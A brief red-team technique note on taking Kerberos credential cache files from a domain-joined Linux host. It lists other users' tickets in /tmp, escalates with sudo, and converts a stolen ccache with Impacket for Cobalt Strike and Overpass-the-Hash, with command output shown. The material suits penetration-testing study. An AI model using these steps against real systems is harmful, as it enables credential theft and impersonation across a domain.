# Linux Credential Cache
Kerberos Credential Cache (ccache) files store the Kerberos credentials, usually a TGT, of a user authenticated to a domain-joined Linux machine. With it you can request a service ticket (TGS) for any other service in the domain.

``````sh
proxychains ssh svc_oracle@10.10.17.12
svc_oracle@nix-1:~$ ls -l /tmp/
total 20
-rw------- 1 john      domain users 1442 Fen  16 18:13 krb5cc_1404221486_AegEwB
-rw------- 1 svc_oracle domain users 1441 Feb 16 18:05 krb5cc_1404221620_WdEgwg

sudo -l
sudo -i
``````

For Cobalt Strike the linux ccache needs to be converted via the following **Impacket** commands to make it compatible with the `kerberos_ccache_use` command. After that the kirbi can be used with [[Overpass-the-Hash]] and a sacrificial logon session.

``````sh
impacket-ticketConverter krb5cc_1404221486_AegEwB doe.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] converting ccache to kirbi...
[+] done
``````


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```